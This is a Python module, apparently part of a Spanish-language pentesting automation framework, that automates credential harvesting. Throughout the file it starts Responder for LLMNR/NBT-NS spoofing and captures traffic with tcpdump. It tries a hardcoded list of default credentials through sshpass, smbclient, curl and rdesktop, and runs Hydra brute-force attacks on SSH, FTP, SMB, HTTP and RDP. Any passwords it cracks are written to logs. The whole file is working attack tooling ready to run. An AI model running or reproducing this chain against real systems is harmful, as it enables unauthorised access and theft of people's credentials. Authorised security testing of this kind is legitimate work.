"""
Módulo de Recolección de Credenciales para Automatización de Pentesting
Incluye LLMNR/NBT-NS spoofing, sniffing de tráfico y ataques de fuerza bruta
"""

import subprocess
import json
import time
import threading
import os
import signal
from typing import Dict, List, Any, Optional
from pathlib import Path
import re
from modules.logging_system import LoggingSystem
from modules.clean_console import CleanConsole
from modules.unified_logging import UnifiedLoggingSystem

class CredentialModule:
    """Módulo de recolección de credenciales"""
    
    def __init__(self, config: Dict[str, Any], logger, unified_logging=None):
        self.config = config
        self.logger = logger
        self.credentials_config = config['credentials']
        self.network_config = config['network_config']
        self.logging_system = LoggingSystem(config, logger)
        self.clean_console = CleanConsole(config, logger)
        self.unified_logging = unified_logging
        
        # Resultados de recolección de credenciales
        self.results = {
            'valid_credentials': [],
            'captured_hashes': [],
            'sniffed_traffic': [],
            'brute_force_results': [],
            'llmnr_spoofing': {},
            'responder_logs': []
        }
        
        # Procesos en background
        self.background_processes = {}
        
        # Archivos de evidencia (ahora en scans/)
        self.evidence_dir = Path("scans/credentials")
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
    
    def _run_command(self, command: List[str], timeout: int = 300, background: bool = False) -> Dict[str, Any]:
        """Ejecutar comando y capturar salida"""
        try:
            self.logger.debug(f"🔧 Ejecutando: {' '.join(command)}")
            
            if background:
                # Ejecutar en background
                process = subprocess.Popen(
                    command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='utf-8',
                    errors='replace'
                )
                
                return {
                    'process': process,
                    'background': True,
                    'success': True
                }
            else:
                # Ejecutar normalmente
                result = subprocess.run(
                    command,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    encoding='utf-8',
                    errors='replace'
                )
                
                # Log del comando
                self.logging_system.log_command(
                    ' '.join(command),
                    result.stdout + result.stderr,
                    result.returncode,
                    "CREDENTIAL_HARVESTING"
                )
                
                return {
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'return_code': result.returncode,
                    'success': result.returncode == 0,
                    'background': False
                }
                
        except subprocess.TimeoutExpired:
            self.logger.error(f"⏰ Timeout ejecutando: {' '.join(command)}")
            return {'stdout': '', 'stderr': 'Timeout', 'return_code': -1, 'success': False, 'background': False}
        except Exception as e:
            self.logger.error(f"❌ Error ejecutando comando: {e}")
            return {'stdout': '', 'stderr': str(e), 'return_code': -1, 'success': False, 'background': False}
    
    def start_responder(self) -> bool:
        """Iniciar Responder para LLMNR/NBT-NS spoofing"""
        self.logger.info("🎣 Iniciando Responder para LLMNR/NBT-NS spoofing...")
        
        interface = self.network_config.get('interface', 'eth0')
        
        try:
            # Comando de Responder
            command = [
                'responder', '-I', interface, '-wrf', '-v'
            ]
            
            result = self._run_command(command, background=True)
            
            if result['success']:
                self.background_processes['responder'] = result['process']
                self.logging_system.log_event(
                    "RESPONDER_STARTED",
                    f"Responder iniciado en interfaz {interface}",
                    {"interface": interface, "pid": result['process'].pid},
                    "CREDENTIAL_HARVESTING"
                )
                
                # Esperar un poco para que Responder se inicie
                time.sleep(5)
                
                self.logger.info("✅ Responder iniciado correctamente")
                return True
            else:
                self.logger.error("❌ Error iniciando Responder")
                return False
                
        except Exception as e:
            self.logger.error(f"❌ Error iniciando Responder: {e}")
            return False
    
    def stop_responder(self):
        """Detener Responder"""
        if 'responder' in self.background_processes:
            try:
                process = self.background_processes['responder']
                process.terminate()
                process.wait(timeout=10)
                self.logger.info("🛑 Responder detenido")
                
                self.logging_system.log_event(
                    "RESPONDER_STOPPED",
                    "Responder detenido",
                    {"pid": process.pid},
                    "CREDENTIAL_HARVESTING"
                )
                
            except Exception as e:
                self.logger.error(f"❌ Error deteniendo Responder: {e}")
                # Forzar terminación
                try:
                    process.kill()
                except:
                    pass
    
    def start_traffic_sniffing(self) -> bool:
        """Iniciar captura de tráfico con tcpdump"""
        self.logger.info("👂 Iniciando captura de tráfico...")
        
        interface = self.network_config.get('interface', 'eth0')
        pcap_file = self.evidence_dir / f"traffic_capture_{int(time.time())}.pcap"
        
        try:
            # Comando de tcpdump
            command = [
                'tcpdump', '-i', interface, '-w', str(pcap_file),
                'port', '80', 'or', 'port', '443', 'or', 'port', '21', 'or', 'port', '23',
                'or', 'port', '25', 'or', 'port', '110', 'or', 'port', '143'
            ]
            
            result = self._run_command(command, background=True)
            
            if result['success']:
                self.background_processes['tcpdump'] = result['process']
                self.results['sniffed_traffic'].append({
                    'pcap_file': str(pcap_file),
                    'start_time': time.time(),
                    'interface': interface
                })
                
                self.logging_system.log_event(
                    "TRAFFIC_SNIFFING_STARTED",
                    f"Captura de tráfico iniciada en {pcap_file}",
                    {"pcap_file": str(pcap_file), "interface": interface},
                    "CREDENTIAL_HARVESTING"
                )
                
                self.logger.info(f"✅ Captura de tráfico iniciada: {pcap_file}")
                return True
            else:
                self.logger.error("❌ Error iniciando captura de tráfico")
                return False
                
        except Exception as e:
            self.logger.error(f"❌ Error iniciando captura de tráfico: {e}")
            return False
    
    def stop_traffic_sniffing(self):
        """Detener captura de tráfico"""
        if 'tcpdump' in self.background_processes:
            try:
                process = self.background_processes['tcpdump']
                process.terminate()
                process.wait(timeout=10)
                self.logger.info("🛑 Captura de tráfico detenida")
                
                self.logging_system.log_event(
                    "TRAFFIC_SNIFFING_STOPPED",
                    "Captura de tráfico detenida",
                    {"pid": process.pid},
                    "CREDENTIAL_HARVESTING"
                )
                
            except Exception as e:
                self.logger.error(f"❌ Error deteniendo captura de tráfico: {e}")
                try:
                    process.kill()
                except:
                    pass
    
    def brute_force_attack(self, targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Realizar ataques de fuerza bruta en servicios encontrados"""
        self.logger.info(f"💥 Iniciando ataques de fuerza bruta en {len(targets)} objetivos...")
        
        brute_force_results = []
        default_users = self.credentials_config.get('default_users', [])
        default_passwords = self.credentials_config.get('default_passwords', [])
        
        for target in targets:
            host = target['host']
            port = target['port']
            service = target['service']
            
            self.logger.info(f"🎯 Atacando {service} en {host}:{port}")
            
            # Ataque específico por servicio
            if service in ['ssh', 'openssh']:
                result = self._brute_force_ssh(host, port, default_users, default_passwords)
            elif service in ['ftp', 'vsftpd', 'proftpd']:
                result = self._brute_force_ftp(host, port, default_users, default_passwords)
            elif service in ['smb', 'netbios-ssn']:
                result = self._brute_force_smb(host, port, default_users, default_passwords)
            elif service in ['http', 'https']:
                result = self._brute_force_http(host, port, default_users, default_passwords)
            elif service in ['rdp', 'ms-wbt-server']:
                result = self._brute_force_rdp(host, port, default_users, default_passwords)
            else:
                self.logger.debug(f"Servicio {service} no soportado para fuerza bruta")
                continue
            
            if result:
                brute_force_results.append(result)
                self.logging_system.log_credential(
                    host, service, result.get('username', 'unknown'), 
                    result.get('success', False), "CREDENTIAL_HARVESTING"
                )
        
        self.results['brute_force_results'] = brute_force_results
        return brute_force_results
    
    def _brute_force_ssh(self, host: str, port: int, users: List[str], passwords: List[str]) -> Optional[Dict[str, Any]]:
        """Ataque de fuerza bruta SSH con Hydra"""
        try:
            # Crear archivo temporal con usuarios
            users_file = self.evidence_dir / "users.txt"
            with open(users_file, 'w') as f:
                for user in users:
                    f.write(f"{user}\n")
            
            # Crear archivo temporal con contraseñas
            passwords_file = self.evidence_dir / "passwords.txt"
            with open(passwords_file, 'w') as f:
                for password in passwords:
                    f.write(f"{password}\n")
            
            # Ejecutar Hydra con consola limpia
            command = [
                'hydra', '-L', str(users_file), '-P', str(passwords_file),
                '-t', '4', '-f', f'ssh://{host}:{port}'
            ]
            
            result = self.clean_console.run_command_clean(
                command,
                f"Fuerza bruta SSH en {host}:{port}",
                f"Credenciales SSH encontradas en {host}",
                f"Fuerza bruta SSH falló en {host}",
                timeout=300
            )
            
            if result['success'] and 'login:' in result['stdout']:
                # Parsear resultado exitoso
                lines = result['stdout'].split('\n')
                for line in lines:
                    if 'login:' in line and 'password:' in line:
                        # Extraer credenciales
                        match = re.search(r'login: (\w+).*password: (\w+)', line)
                        if match:
                            username = match.group(1)
                            password = match.group(2)
                            
                            credential = {
                                'host': host,
                                'port': port,
                                'service': 'ssh',
                                'username': username,
                                'password': password,
                                'method': 'hydra_brute_force',
                                'success': True,
                                'timestamp': time.time()
                            }
                            
                            self.results['valid_credentials'].append(credential)
                            self.logger.info(f"✅ Credencial SSH encontrada: {username}:{password}@{host}")
                            return credential
            
            # Limpiar archivos temporales
            users_file.unlink(missing_ok=True)
            passwords_file.unlink(missing_ok=True)
            
        except Exception as e:
            self.logger.error(f"❌ Error en fuerza bruta SSH {host}:{port}: {e}")
        
        return None
    
    def _brute_force_ftp(self, host: str, port: int, users: List[str], passwords: List[str]) -> Optional[Dict[str, Any]]:
        """Ataque de fuerza bruta FTP con Hydra"""
        try:
            # Crear archivos temporales
            users_file = self.evidence_dir / "users.txt"
            passwords_file = self.evidence_dir / "passwords.txt"
            
            with open(users_file, 'w') as f:
                for user in users:
                    f.write(f"{user}\n")
            
            with open(passwords_file, 'w') as f:
                for password in passwords:
                    f.write(f"{password}\n")
            
            # Ejecutar Hydra para FTP
            command = [
                'hydra', '-L', str(users_file), '-P', str(passwords_file),
                '-t', '4', '-f', f'ftp://{host}:{port}'
            ]
            
            result = self._run_command(command, timeout=300)
            
            if result['success'] and 'login:' in result['stdout']:
                lines = result['stdout'].split('\n')
                for line in lines:
                    if 'login:' in line and 'password:' in line:
                        match = re.search(r'login: (\w+).*password: (\w+)', line)
                        if match:
                            username = match.group(1)
                            password = match.group(2)
                            
                            credential = {
                                'host': host,
                                'port': port,
                                'service': 'ftp',
                                'username': username,
                                'password': password,
                                'method': 'hydra_brute_force',
                                'success': True,
                                'timestamp': time.time()
                            }
                            
                            self.results['valid_credentials'].append(credential)
                            self.logger.info(f"✅ Credencial FTP encontrada: {username}:{password}@{host}")
                            return credential
            
            # Limpiar archivos temporales
            users_file.unlink(missing_ok=True)
            passwords_file.unlink(missing_ok=True)
            
        except Exception as e:
            self.logger.error(f"❌ Error en fuerza bruta FTP {host}:{port}: {e}")
        
        return None
    
    def _brute_force_smb(self, host: str, port: int, users: List[str], passwords: List[str]) -> Optional[Dict[str, Any]]:
        """Ataque de fuerza bruta SMB con Hydra"""
        try:
            # Crear archivos temporales
            users_file = self.evidence_dir / "users.txt"
            passwords_file = self.evidence_dir / "passwords.txt"
            
            with open(users_file, 'w') as f:
                for user in users:
                    f.write(f"{user}\n")
            
            with open(passwords_file, 'w') as f:
                for password in passwords:
                    f.write(f"{password}\n")
            
            # Ejecutar Hydra para SMB
            command = [
                'hydra', '-L', str(users_file), '-P', str(passwords_file),
                '-t', '4', '-f', f'smb://{host}:{port}'
            ]
            
            result = self._run_command(command, timeout=300)
            
            if result['success'] and 'login:' in result['stdout']:
                lines = result['stdout'].split('\n')
                for line in lines:
                    if 'login:' in line and 'password:' in line:
                        match = re.search(r'login: (\w+).*password: (\w+)', line)
                        if match:
                            username = match.group(1)
                            password = match.group(2)
                            
                            credential = {
                                'host': host,
                                'port': port,
                                'service': 'smb',
                                'username': username,
                                'password': password,
                                'method': 'hydra_brute_force',
                                'success': True,
                                'timestamp': time.time()
                            }
                            
                            self.results['valid_credentials'].append(credential)
                            self.logger.info(f"✅ Credencial SMB encontrada: {username}:{password}@{host}")
                            return credential
            
            # Limpiar archivos temporales
            users_file.unlink(missing_ok=True)
            passwords_file.unlink(missing_ok=True)
            
        except Exception as e:
            self.logger.error(f"❌ Error en fuerza bruta SMB {host}:{port}: {e}")
        
        return None
    
    def _brute_force_http(self, host: str, port: int, users: List[str], passwords: List[str]) -> Optional[Dict[str, Any]]:
        """Ataque de fuerza bruta HTTP con Hydra"""
        try:
            # Crear archivos temporales
            users_file = self.evidence_dir / "users.txt"
            passwords_file = self.evidence_dir / "passwords.txt"
            
            with open(users_file, 'w') as f:
                for user in users:
                    f.write(f"{user}\n")
            
            with open(passwords_file, 'w') as f:
                for password in passwords:
                    f.write(f"{password}\n")
            
            # Ejecutar Hydra para HTTP
            command = [
                'hydra', '-L', str(users_file), '-P', str(passwords_file),
                '-t', '4', '-f', f'http-get://{host}:{port}/'
            ]
            
            result = self._run_command(command, timeout=300)
            
            if result['success'] and 'login:' in result['stdout']:
                lines = result['stdout'].split('\n')
                for line in lines:
                    if 'login:' in line and 'password:' in line:
                        match = re.search(r'login: (\w+).*password: (\w+)', line)
                        if match:
                            username = match.group(1)
                            password = match.group(2)
                            
                            credential = {
                                'host': host,
                                'port': port,
                                'service': 'http',
                                'username': username,
                                'password': password,
                                'method': 'hydra_brute_force',
                                'success': True,
                                'timestamp': time.time()
                            }
                            
                            self.results['valid_credentials'].append(credential)
                            self.logger.info(f"✅ Credencial HTTP encontrada: {username}:{password}@{host}")
                            return credential
            
            # Limpiar archivos temporales
            users_file.unlink(missing_ok=True)
            passwords_file.unlink(missing_ok=True)
            
        except Exception as e:
            self.logger.error(f"❌ Error en fuerza bruta HTTP {host}:{port}: {e}")
        
        return None
    
    def _brute_force_rdp(self, host: str, port: int, users: List[str], passwords: List[str]) -> Optional[Dict[str, Any]]:
        """Ataque de fuerza bruta RDP con Hydra"""
        try:
            # Crear archivos temporales
            users_file = self.evidence_dir / "users.txt"
            passwords_file = self.evidence_dir / "passwords.txt"
            
            with open(users_file, 'w') as f:
                for user in users:
                    f.write(f"{user}\n")
            
            with open(passwords_file, 'w') as f:
                for password in passwords:
                    f.write(f"{password}\n")
            
            # Ejecutar Hydra para RDP
            command = [
                'hydra', '-L', str(users_file), '-P', str(passwords_file),
                '-t', '4', '-f', f'rdp://{host}:{port}'
            ]
            
            result = self._run_command(command, timeout=300)
            
            if result['success'] and 'login:' in result['stdout']:
                lines = result['stdout'].split('\n')
                for line in lines:
                    if 'login:' in line and 'password:' in line:
                        match = re.search(r'login: (\w+).*password: (\w+)', line)
                        if match:
                            username = match.group(1)
                            password = match.group(2)
                            
                            credential = {
                                'host': host,
                                'port': port,
                                'service': 'rdp',
                                'username': username,
                                'password': password,
                                'method': 'hydra_brute_force',
                                'success': True,
                                'timestamp': time.time()
                            }
                            
                            self.results['valid_credentials'].append(credential)
                            self.logger.info(f"✅ Credencial RDP encontrada: {username}:{password}@{host}")
                            return credential
            
            # Limpiar archivos temporales
            users_file.unlink(missing_ok=True)
            passwords_file.unlink(missing_ok=True)
            
        except Exception as e:
            self.logger.error(f"❌ Error en fuerza bruta RDP {host}:{port}: {e}")
        
        return None
    
    def check_default_credentials(self, targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Verificar credenciales por defecto en servicios"""
        self.logger.info("🔍 Verificando credenciales por defecto...")
        
        default_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', ''),
            ('administrator', 'administrator'),
            ('root', 'root'),
            ('root', ''),
            ('guest', 'guest'),
            ('user', 'user'),
            ('test', 'test'),
            ('demo', 'demo')
        ]
        
        valid_credentials = []
        
        for target in targets:
            host = target['host']
            port = target['port']
            service = target['service']
            
            self.logger.info(f"🔑 Verificando credenciales por defecto en {service}@{host}:{port}")
            
            for username, password in default_credentials:
                if self._test_credential(host, port, service, username, password):
                    credential = {
                        'host': host,
                        'port': port,
                        'service': service,
                        'username': username,
                        'password': password,
                        'method': 'default_credentials',
                        'success': True,
                        'timestamp': time.time()
                    }
                    
                    valid_credentials.append(credential)
                    self.results['valid_credentials'].append(credential)
                    
                    self.logging_system.log_credential(
                        host, service, username, True, "CREDENTIAL_HARVESTING"
                    )
                    
                    self.logger.info(f"✅ Credencial por defecto encontrada: {username}:{password}@{host}")
                    break  # No probar más credenciales para este servicio
        
        return valid_credentials
    
    def _test_credential(self, host: str, port: int, service: str, username: str, password: str) -> bool:
        """Probar una credencial específica"""
        try:
            if service in ['ssh', 'openssh']:
                return self._test_ssh_credential(host, port, username, password)
            elif service in ['ftp', 'vsftpd', 'proftpd']:
                return self._test_ftp_credential(host, port, username, password)
            elif service in ['smb', 'netbios-ssn']:
                return self._test_smb_credential(host, port, username, password)
            elif service in ['http', 'https']:
                return self._test_http_credential(host, port, username, password)
            elif service in ['rdp', 'ms-wbt-server']:
                return self._test_rdp_credential(host, port, username, password)
            
        except Exception as e:
            self.logger.debug(f"Error probando credencial {username}@{host}:{port}: {e}")
        
        return False
    
    def _test_ssh_credential(self, host: str, port: int, username: str, password: str) -> bool:
        """Probar credencial SSH"""
        try:
            # Usar sshpass para autenticación automática
            command = [
                'sshpass', '-p', password, 'ssh', '-o', 'StrictHostKeyChecking=no',
                '-o', 'ConnectTimeout=10', '-p', str(port), f'{username}@{host}', 'exit'
            ]
            
            result = self._run_command(command, timeout=15)
            return result['success']
            
        except Exception:
            return False
    
    def _test_ftp_credential(self, host: str, port: int, username: str, password: str) -> bool:
        """Probar credencial FTP"""
        try:
            # Crear script FTP temporal
            ftp_script = self.evidence_dir / "ftp_test.txt"
            with open(ftp_script, 'w') as f:
                f.write(f"user {username} {password}\n")
                f.write("quit\n")
            
            command = ['ftp', '-n', '-v', host, str(port)]
            
            with open(ftp_script, 'r') as script_file:
                result = subprocess.run(
                    command,
                    stdin=script_file,
                    capture_output=True,
                    text=True,
                    timeout=15
                )
            
            ftp_script.unlink(missing_ok=True)
            return result.returncode == 0 and '230' in result.stdout
            
        except Exception:
            return False
    
    def _test_smb_credential(self, host: str, port: int, username: str, password: str) -> bool:
        """Probar credencial SMB"""
        try:
            command = [
                'smbclient', '-L', f'//{host}', '-U', f'{username}%{password}',
                '-p', str(port), '-N'
            ]
            
            result = self._run_command(command, timeout=15)
            return result['success'] and 'Sharename' in result['stdout']
            
        except Exception:
            return False
    
    def _test_http_credential(self, host: str, port: int, username: str, password: str) -> bool:
        """Probar credencial HTTP"""
        try:
            # Usar curl para probar autenticación HTTP básica
            command = [
                'curl', '-s', '-o', '/dev/null', '-w', '%{http_code}',
                '-u', f'{username}:{password}', f'http://{host}:{port}/'
            ]
            
            result = self._run_command(command, timeout=15)
            return result['success'] and result['stdout'].strip() == '200'
            
        except Exception:
            return False
    
    def _test_rdp_credential(self, host: str, port: int, username: str, password: str) -> bool:
        """Probar credencial RDP"""
        try:
            # Usar rdesktop para probar RDP
            command = [
                'rdesktop', '-u', username, '-p', password,
                '-g', '800x600', '-T', 'Test', f'{host}:{port}'
            ]
            
            # Ejecutar con timeout
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            try:
                stdout, stderr = process.communicate(timeout=10)
                return process.returncode == 0
            except subprocess.TimeoutExpired:
                process.kill()
                return False
            
        except Exception:
            return False
    
    def collect_responder_logs(self):
        """Recopilar logs de Responder"""
        self.logger.info("📋 Recopilando logs de Responder...")
        
        try:
            # Buscar archivos de log de Responder
            responder_logs = [
                '/usr/share/responder/logs/',
                '/var/log/responder/',
                './logs/'
            ]
            
            for log_dir in responder_logs:
                if os.path.exists(log_dir):
                    for file in os.listdir(log_dir):
                        if file.endswith('.txt') or file.endswith('.log'):
                            log_file = os.path.join(log_dir, file)
                            try:
                                with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                
                                self.results['responder_logs'].append({
                                    'file': log_file,
                                    'content': content,
                                    'size': len(content)
                                })
                                
                                self.logging_system.log_event(
                                    "RESPONDER_LOG_COLLECTED",
                                    f"Log de Responder recopilado: {log_file}",
                                    {"file": log_file, "size": len(content)},
                                    "CREDENTIAL_HARVESTING"
                                )
                                
                            except Exception as e:
                                self.logger.debug(f"Error leyendo log {log_file}: {e}")
            
            self.logger.info(f"✅ {len(self.results['responder_logs'])} logs de Responder recopilados")
            
        except Exception as e:
            self.logger.error(f"❌ Error recopilando logs de Responder: {e}")
    
    def cleanup_background_processes(self):
        """Limpiar procesos en background"""
        self.logger.info("🧹 Limpiando procesos en background...")
        
        for name, process in self.background_processes.items():
            try:
                process.terminate()
                process.wait(timeout=10)
                self.logger.info(f"🛑 Proceso {name} detenido")
            except Exception as e:
                self.logger.error(f"❌ Error deteniendo proceso {name}: {e}")
                try:
                    process.kill()
                except:
                    pass
        
        self.background_processes.clear()
    
    def run(self) -> Dict[str, Any]:
        """Ejecutar módulo completo de recolección de credenciales"""
        self.logger.info("🚀 INICIANDO MÓDULO DE RECOLECCIÓN DE CREDENCIALES")
        
        start_time = time.time()
        
        try:
            # 1. Iniciar herramientas de captura en background
            responder_started = self.start_responder()
            sniffing_started = self.start_traffic_sniffing()
            
            # 2. Obtener objetivos del reconocimiento anterior
            # (En un escenario real, esto vendría del módulo de reconocimiento)
            # Por ahora, usaremos objetivos de ejemplo
            sample_targets = [
                {'host': '192.168.1.1', 'port': 22, 'service': 'ssh'},
                {'host': '192.168.1.1', 'port': 21, 'service': 'ftp'},
                {'host': '192.168.1.1', 'port': 80, 'service': 'http'},
                {'host': '192.168.1.1', 'port': 445, 'service': 'smb'},
                {'host': '192.168.1.1', 'port': 3389, 'service': 'rdp'}
            ]
            
            # 3. Verificar credenciales por defecto
            default_creds = self.check_default_credentials(sample_targets)
            
            # 4. Realizar ataques de fuerza bruta
            brute_force_results = self.brute_force_attack(sample_targets)
            
            # 5. Esperar un tiempo para captura pasiva
            self.logger.info("⏳ Esperando captura pasiva de credenciales (60 segundos)...")
            time.sleep(60)
            
            # 6. Recopilar logs de Responder
            if responder_started:
                self.collect_responder_logs()
            
            # 7. Detener herramientas de captura
            if responder_started:
                self.stop_responder()
            if sniffing_started:
                self.stop_traffic_sniffing()
            
            # 8. Guardar evidencia
            if self.unified_logging:
                # Agregar credenciales al sistema unificado
                for cred in self.results.get('valid_credentials', []):
                    self.unified_logging.add_credentials([cred], "captured")
                
                for cred in self.results.get('captured_hashes', []):
                    self.unified_logging.add_credentials([cred], "cracked")
                
                # Marcar fase como completada
                self.unified_logging.mark_phase_completed('credential_harvesting')
                self.logger.info("✅ Credenciales agregadas al sistema unificado")
            else:
                # Fallback al sistema anterior
                self.logging_system.save_json_evidence(
                    'credential_harvesting_results.json',
                    self.results,
                    'data'
                )
            
            end_time = time.time()
            duration = end_time - start_time
            
            self.logger.info(f"✅ RECOLECCIÓN DE CREDENCIALES COMPLETADA en {duration:.2f} segundos")
            self.logger.info(f"📊 Resumen: {len(self.results['valid_credentials'])} credenciales válidas encontradas")
            
            return self.results
            
        except Exception as e:
            self.logger.error(f"❌ Error en módulo de recolección de credenciales: {e}")
            return self.results
        finally:
            # Limpiar procesos en background
            self.cleanup_background_processes()
